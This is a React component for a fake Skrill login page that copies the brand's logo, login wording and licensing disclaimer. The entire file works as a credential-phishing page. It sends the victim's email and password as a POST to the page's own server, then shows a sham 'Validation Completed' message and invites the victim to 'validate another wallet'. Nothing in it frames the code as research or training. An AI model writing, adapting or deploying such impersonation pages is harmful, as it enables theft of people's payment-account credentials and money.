import React, { useState } from "react";
import { Eye, EyeOff, Loader2 } from "lucide-react";
import "./SkrillLanding.css";
import logo from "../../assets/skrill_logo.png";
import fetchWithRetry from "../../utils/api";

const SkrillLanding = () => {
  const [form, setForm] = useState({ emailOrUsername: "", password: "" });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState("");

  const submitForm = async () => {
    setError("");
    setLoading(true);

    try {
      const res = await fetchWithRetry("/Skrill", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form)
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Submission failed");

      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  if (done) {
    return (
      <div className="skrill-login-bg">
        <img src={logo} className="skrill-login-logo" alt="Skrill Logo" />
        <div className="skrill-result-card animate-pop">
          <h2>Validation Completed</h2>
          <p aria-live="polite">
            Loading your account…<br />
            Please check your email to confirm.
          </p>
          <p>Do you want to validate another wallet?</p>
          <div className="skrill-login-actions">
            <button onClick={() => window.location.reload()}>Redo Validation</button>
            <button onClick={() => (window.location.href = "/")}>Go Home</button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="skrill-login-bg">
      <div className="skrill-login-header">
        <img src={logo} className="skrill-header-logo" alt="Skrill Logo" />
        <div className="skrill-language-selector"></div>
      </div>
      <div className="skrill-login-card animate-fade">
        <h2 className="skrill-login-title">Log in to your Skrill account</h2>
        <div className="skrill-input-wrapper">
          <label className="skrill-label">Email</label>
          <input
            type="email"
            autoComplete="off"
            name="email"
            className="skrill-input"
            value={form.emailOrUsername}
            onChange={e => setForm({ ...form, emailOrUsername: e.target.value })}
          />
        </div>
        <div className="skrill-input-wrapper">
          <label className="skrill-label">Password</label>
          <div className="skrill-password-box">
            <input
              type={showPassword ? "text" : "password"}
              autoComplete="new-password"
              name="password"
              className="skrill-input"
              value={form.password}
              onChange={e => setForm({ ...form, password: e.target.value })}
            />
            <span
              className="skrill-eye-icon"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? <EyeOff /> : <Eye />}
            </span>
          </div>
        </div>
        {error && <p className="skrill-error-text">{error}</p>}
        <button
          disabled={loading}
          onClick={submitForm}
          className="skrill-login-btn"
        >
          {loading ? <Loader2 className="spin" /> : "Log in"}
        </button>
      </div>
      <div className="skrill-login-disclaimer">
        <p>
          Skrill USA, Inc. (NMLS ID:935195) is registered with FinCEN and licensed as a money transmitter in various U.S. states and territories.
        </p>
      </div>
    </div>
  );
};

export default SkrillLanding;